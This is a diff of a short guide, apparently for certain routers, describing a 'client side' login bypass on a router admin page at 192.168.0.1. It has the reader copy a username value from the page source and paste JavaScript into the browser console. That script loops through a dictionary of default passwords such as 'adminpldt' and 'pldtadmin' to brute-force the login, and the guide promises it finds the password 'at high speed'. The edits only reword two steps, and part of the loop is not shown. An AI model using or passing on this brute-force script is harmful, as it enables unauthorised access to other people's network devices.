@@ -3,7 +3,7 @@ Note: This might work in other versions too maybe, also this bypass is client sp
 1.Visit http://192.168.0.1/
 2.Open Inspect Element and go to Elements.
 3.Find this variable UserNameNormal and copy the value of the variable.
-3.Go to console but first paste the UserNameNormal value on the username input of the login lastly paste this code there:
+3.Go to console but first paste the UserNameNormal value on the username input of the login lastly paste this code in the console:
 var passwords = ["a", "b", "c", "root", "admin", "default123", "default12", "default", "default1234", "rootadmin", "default12345", "adminpldt", "pldtadmin"] //Your passwords dictionary
 
 for( i in passwords ){
@@ -16,4 +16,4 @@ for( i in passwords ){
     }
 }
 
-4.Press enter, and watch it find the password at high speed :)
+4.Press enter, and watch it find the password account at high speed :)
